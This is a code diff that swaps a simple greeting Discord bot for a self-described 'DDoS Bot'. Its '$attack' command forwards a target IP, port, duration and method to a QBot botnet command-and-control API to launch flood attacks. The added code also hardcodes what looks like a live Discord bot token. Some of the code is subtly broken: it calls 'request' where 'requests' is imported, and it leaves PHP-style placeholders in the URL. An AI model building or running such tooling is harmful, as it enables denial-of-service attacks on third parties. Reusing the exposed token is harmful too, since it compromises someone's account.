@@ -1,32 +1,22 @@
-from cmath import log
-from distutils.sysconfig import PREFIX
-import discord
-from dotenv import load_dotenv
-import os
-load_dotenv()
+#discord DDoS Bot
+#use QBOT.php to connect to c2
+#yes, you must have a qbot setup to use this
+#coded by void
+import discord, requests
+from discord.ext import commands
 
-PREFIX = os.environ['PREFIX']
-TOKEN = os.environ['TOKEN']
-
-client = discord.Client()
+client = commands.Bot(command_prefix = "$")#changeme
 
 @client.event
 async def on_ready():
-    print(f'Logged in as {client.user}.')
+	print("bot started")
 
-@client.event
-async def on_message(message):
-    if message.author == client.user:
-        return
+@client.command()
+async def attack(ctx, ip, port, time, method):
+	request.get("http://1.1.1.1/API.php?&host=$host&port=$port&time=$time&type=$method")#changeme
+	embed = discord.Embed(
+		title = 'Attack Sent',
+		description = f'Attacking: {ip}\nPort: {port}\nTime: {time}\nMethod: {method}')
+	await ctx.send(embed=embed)
 
-    if message.content == f'{PREFIX}call':
-        await message.channel.send("callback!")
-
-    if message.content.startswith(f'{PREFIX}hello'):
-        await message.channel.send('Hello!')
-
-
-try:
-    client.run(TOKEN)
-except discord.errors.LoginFailure as e:
-    print("Improper token has been passed.")
+client.run("MTA3NTcyMTIwNDU5NTQ0MTczNA.GeAeO_.sZfVSESI7THtzGb_CNeRO7ZapEeqokHGmUo3VQ")#changeme
